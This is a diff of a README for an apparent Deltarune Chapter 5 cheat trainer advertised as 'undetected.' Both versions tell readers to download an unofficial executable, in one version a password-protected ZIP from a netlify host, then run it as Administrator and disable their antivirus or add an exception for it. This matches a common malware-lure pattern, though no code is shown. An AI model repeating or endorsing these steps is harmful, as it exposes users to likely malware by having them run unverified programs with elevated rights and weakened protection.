@@ -1,50 +1,67 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# 🎮 Deltarune-Chapter5-Trainer-Undetected - Improve your gameplay with easy tools
 
-![Version](https://img.shields.io/badge/version-1.0.2-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+<a href="https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases">
+  <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
+</a>
 
-## 🚀 Features
+This tool allows players to change game settings in Deltarune Chapter 5. You can adjust health, stats, items, and speed. It runs outside the game process to keep your experience smooth. Use this tool for single-player exploration.
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+## 🛠️ System Requirements
+Your computer needs to meet these basic standards to run the trainer:
 
-## 📥 Download & Installation
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Storage Space: 50 MB of free disk space.
+- Game Version: Deltarune Chapter 5 must be installed on your computer.
+- Software: Microsoft .NET Framework 4.8 or newer.
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+If your computer meets these requirements, the trainer will function as intended.
 
-## 💻 Compatibility
+## 📥 Getting the Software
+You must visit the project release page to download the latest version of the trainer. Follow these steps to obtain the correct file:
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+1. Visit the [official releases page](https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases).
+2. Look for the section marked Latest.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to a folder where you can find it later.
 
-## 🔧 Troubleshooting
+This file contains the full tool. Do not rename the file, as it needs to communicate with the game correctly.
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+## ⚙️ Running the Trainer
+After you download the file, launch the game first. Follow these steps to use the features properly:
 
-## 📄 License
+1. Start Deltarune Chapter 5 on your computer.
+2. Select your save file and enter the game world.
+3. Minimize the game window by pressing the Windows key + M or by clicking the minimize icon.
+4. Open the trainer file you downloaded earlier.
+5. Grant the program permission to run if your computer asks for confirmation.
+6. The trainer interface will appear on your screen.
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+Ensure both the game and the trainer remain open during your session.
 
----
+## 🕹️ Available Features
+The interface provides buttons for each game modification. Once you enable a feature, it stays active until you turn it off or close the application:
 
-`bullet-hell` `windows` `rpg-trainer` `deltarune` `game-tool` `undetected` `deltarune-chapter-5` `mod-menu` `chapter-5` `trainer` `unlimited-items` `single-player` `steam` `toby-fox` `game-trainer`
+- Infinite HP: Your character health stays full at all times.
+- Max Stats: Increases attack and defense values to their highest limits.
+- Unlimited Items: Keeps your inventory full regardless of how many items you use.
+- Speed Control: Adjusts the movement speed of your character for faster traversal.
+
+Click the switch next to each label to toggle the effect. You will see a green light when a feature is active.
+
+## ⚠️ Important Troubleshooting
+Most users experience no issues during setup. If the trainer fails to connect with the game, try these steps:
+
+- Run the trainer as an administrator: Right-click the file and select Run as administrator.
+- Check your antivirus: Some security software blocks external tools. Add an exception for the trainer file in your settings if the program fails to open.
+- Screen resolution: If the window appears off-center, restart the trainer while the game window is in Windowed mode.
+
+If you encounter performance drops, close other background applications that consume memory.
+
+## 🛡️ Safety and Fair Usage
+This tool operates as an external overlay. It does not modify game files. It simply reads game data to display and toggle your chosen settings. 
+
+- Use the tool only for single-player exploration.
+- Do not use this tool on public servers or online game modes.
+- Keep the software updated by checking the download page occasionally.
+
+The software tracks your current session only. Closing the trainer or the game resets all values to original game defaults. Nothing is permanent unless you save your game status within the game menu after making changes.
